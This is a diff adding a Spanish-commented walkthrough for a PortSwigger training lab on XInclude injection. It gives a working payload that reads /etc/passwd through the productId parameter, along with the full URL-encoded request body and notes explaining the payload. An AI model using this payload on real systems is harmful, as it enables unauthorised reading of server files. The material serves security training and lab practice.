@@ -1,0 +1,30 @@
+<!--
+  PortSwigger Lab: Exploiting XInclude to retrieve files
+
+  Body para Repeater. Mantener Content-Type: application/x-www-form-urlencoded
+  (NO application/xml; este lab no acepta XML directo del usuario).
+
+  El snippet XInclude se inyecta dentro del valor del parametro productId.
+  El server lo embebe en su propio XML server-side y el parser, con XInclude
+  habilitado, resuelve la inclusion file:// y mete el contenido del archivo
+  en el documento procesado. Como productId termina reflejado en el error
+  "Invalid product ID: ...", el archivo aparece en la respuesta HTTP.
+
+  Snippet a injectar en productId (URL-encodear con Ctrl+U en Burp):
+-->
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+<!--
+  Body completo a enviar (URL-encoded por Burp automaticamente al usar Ctrl+U
+  sobre la seleccion del snippet, no sobre el storeId):
+
+  productId=%3cfoo+xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%3cxi%3ainclude+parse%3d%22text%22+href%3d%22file%3a%2f%2f%2fetc%2fpasswd%22%2f%3e%3c%2ffoo%3e&storeId=1
+
+  Notas:
+  - parse="text" obliga a tratar /etc/passwd como string. Sin esto, el parser
+    intentaria tratarlo como XML y fallaria por no ser XML valido.
+  - El elemento envoltorio <foo> es necesario porque <xi:include> debe estar
+    dentro de algun elemento padre. El nombre es arbitrario.
+  - El namespace xmlns:xi="http://www.w3.org/2001/XInclude" debe estar
+    declarado correctamente o el parser ignora el elemento.
+-->
